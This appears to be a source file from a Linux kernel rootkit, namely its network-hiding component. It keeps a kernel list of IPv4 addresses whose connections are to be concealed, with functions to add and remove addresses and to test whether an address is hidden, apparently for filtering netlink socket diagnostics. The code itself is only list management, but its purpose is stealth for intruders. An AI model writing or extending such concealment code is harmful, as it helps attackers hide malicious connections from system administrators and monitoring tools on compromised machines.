#include <linux/version.h>
#include <linux/inet.h>
#include <linux/netlink.h>
#include <linux/inet_diag.h>

#include "network.h"
#include "string_helpers.h"
LIST_HEAD(hidden_conn_list);
void network_hide_add(struct sockaddr_in addr)
{
    struct hidden_conn *hc;

    hc = kmalloc(sizeof(*hc), GFP_KERNEL);

	if (!hc)
	    return;

	hc->addr = addr;
    list_add(&hc->list, &hidden_conn_list);
}

void network_hide_remove(struct sockaddr_in addr)
{
    struct hidden_conn *hc;

    list_for_each_entry(hc, &hidden_conn_list, list)
	{
		if (addr.sin_addr.s_addr == hc->addr.sin_addr.s_addr) {
				list_del(&hc->list);
				kfree(hc);
				break;
		}
	}
}

int is_addr_hidden(struct sockaddr_in addr)
{
    struct hidden_conn *hc;

    list_for_each_entry(hc, &hidden_conn_list, list)
	{
		if (addr.sin_addr.s_addr == hc->addr.sin_addr.s_addr)
			return 1;
	}

	return 0;
}
